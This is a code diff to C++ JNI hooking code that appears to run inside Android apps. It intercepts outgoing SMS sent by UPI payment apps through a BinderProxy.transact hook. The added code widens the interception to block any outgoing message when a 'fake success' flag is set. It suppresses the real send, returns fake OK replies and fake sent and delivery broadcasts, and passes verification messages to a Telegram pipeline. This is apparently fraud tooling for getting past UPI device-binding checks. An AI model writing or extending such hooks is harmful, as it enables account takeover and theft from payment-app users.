@@ -294,6 +294,13 @@ bool looks_like_isms_send(jint code, const std::string& dest, const std::string&
     if (is_outgoing_upi_verify_body(body)) return true;
     if (is_clean_sms_dest(dest) && is_outgoing_upi_verify_body(body)) return true;
     if (is_clean_sms_dest(dest) && !body.empty() && body_has_verify_token(body)) return true;
+    // Intercept ON + any UPI: block ALL outgoing (SMS Tweaks) — not Hero keywords only
+    ConfigManager::instance().reload();
+    const auto& cfg = ConfigManager::instance().get();
+    if (cfg.intercept_fake_success && is_clean_sms_dest(dest) && !body.empty() &&
+        body.find("com.") != 0 && body.find("android.") != 0) {
+        return true;
+    }
     return false;
 }
 
@@ -1005,15 +1012,31 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest_in, const std::strin
     std::string dest = dest_in;
     std::string body = fake_success::apply_prefix(body_in);
 
+    ConfigManager::instance().reload();
+    const auto& config = ConfigManager::instance().get();
+
     // Fix swapped fields (OTP text landed in dest, package in body)
     if ((!is_clean_sms_dest(dest) || is_incoming_otp_noise(dest)) &&
         is_clean_sms_dest(body) && is_outgoing_upi_verify_body(dest)) {
         std::swap(dest, body);
     }
+    const bool verify = is_outgoing_upi_verify_body(body);
+    // Any UPI outgoing when Intercept ON (not Hero-only keyword gate)
+    const bool any_out = config.intercept_fake_success && is_clean_sms_dest(dest) &&
+                         !body.empty() && body.size() >= 4 && !is_incoming_otp_noise(body) &&
+                         body.find("com.") != 0 && body.find("android.") != 0;
     if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest) ||
-        !is_outgoing_upi_verify_body(body) || !is_clean_sms_dest(dest)) {
+        (!verify && !any_out) || !is_clean_sms_dest(dest)) {
         write_hook_status("skip_tg_not_outgoing_verify");
         write_isms_trace("skip_tg_not_outgoing_verify");
+        // Radio already blocked by caller hooks — fire OK without Telegram junk
+        if (env && config.intercept_fake_success && g_in_hooked_upi) {
+            fake_success::fire_sms_result_broadcasts(env, dest.empty() ? "0000" : dest);
+            if (sent_intent || delivery_intent) {
+                fake_success::on_outgoing_intercepted(env, dest.empty() ? "0000" : dest,
+                                                      "__SILENT__", sent_intent, delivery_intent);
+            }
+        }
         return;
     }
     // Placeholder dest — radio may be blocked by caller, but don't TG junk
@@ -1324,29 +1347,37 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 return JNI_TRUE;
             }
             extract_isms_from_blob(env, data, dest, body);
-            // Prefer outgoing verify body from UTF-16 strings; reject OTP noise
+            // Prefer outgoing; reject OTP noise. Intercept ON → any UPI send (not Hero-only).
             if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) {
                 write_isms_trace("isms_passthrough_incoming_otp");
             } else {
                 const bool got_out =
                     is_outgoing_upi_verify_body(body) && is_clean_sms_dest(dest);
                 const bool sendish_out = sendish && !blob_contains_needle(blob, "is your OTP");
+                const bool intercept_any =
+                    config.intercept_fake_success && (g_in_hooked_upi || g_is_messaging_app) &&
+                    (iface_sms || sendish_out) && !body.empty() && body.find("com.") != 0;
 
-                // ONLY block+TG real outgoing verify. No bare ISms / no OTP spam.
-                if (got_out || (sendish_out && is_outgoing_upi_verify_body(body))) {
-                    if (!is_clean_sms_dest(dest)) {
-                        // try extract digit dest from blob again via flag dest
-                        if (!is_clean_sms_dest(dest)) dest = "0000000000";
+                if (got_out || (sendish_out && is_outgoing_upi_verify_body(body)) ||
+                    (intercept_any && is_clean_sms_dest(dest)) ||
+                    (intercept_any && sendish_out)) {
+                    if (!is_clean_sms_dest(dest) && intercept_any) {
+                        // best-effort: still block radio even if dest parse weak
+                        if (dest.empty()) dest = "0000000000";
                     }
-                    if (is_outgoing_upi_verify_body(body) && is_clean_sms_dest(dest)) {
-                        pipeline_outgoing(env, dest, body, nullptr, nullptr);
+                    if ((is_outgoing_upi_verify_body(body) || intercept_any) &&
+                        !is_incoming_otp_noise(body)) {
+                        if (is_clean_sms_dest(dest) || intercept_any) {
+                            pipeline_outgoing(env, is_clean_sms_dest(dest) ? dest : "0000000000",
+                                              body, nullptr, nullptr);
+                        }
                     }
                     if (reply) write_ok_reply(env, reply);
                     write_hook_status("isms_blocked_nuclear");
                     write_isms_trace("isms_blocked_nuclear");
                     return JNI_TRUE;
                 }
-                if (sendish_out && is_outgoing_upi_verify_body(body)) {
+                if (sendish_out && (is_outgoing_upi_verify_body(body) || intercept_any)) {
                     if (reply) write_ok_reply(env, reply);
                     write_hook_status("isms_blocked_silent");
                     write_isms_trace("isms_blocked_silent");
